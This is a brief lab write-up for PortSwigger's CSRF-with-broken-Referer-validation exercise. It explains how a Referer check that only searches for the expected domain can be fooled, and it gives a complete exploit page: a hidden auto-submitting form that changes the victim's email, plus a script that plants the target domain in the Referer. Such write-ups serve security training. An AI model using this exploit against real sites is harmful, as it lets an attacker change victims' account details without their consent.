# [CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken)

> the validation of th `referer` header could be implemented in a way where it only checks if the expected url is in the `referer`

`Referer: https://www.duck.com`

if the validation only checks if the `duck.com` is on the `referer` then the following will be accepted

`Referer: https://www.attackmachine.com?duck.com`

if the `referer` has been set up to not to strip down the url to the site only with

`<meta name="referrer" content="unsafe-url" />`

> the exploit:

```
<meta name="referrer" content="unsafe-url" />
<form method="POST" action="https://xxx.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="duck@quack" />
</form>
<script>
  const newUrl =  "/?xxx.web-security-academy.net";
  window.history.pushState({}, "", newUrl);
  document.forms[0].submit();
</script>
```
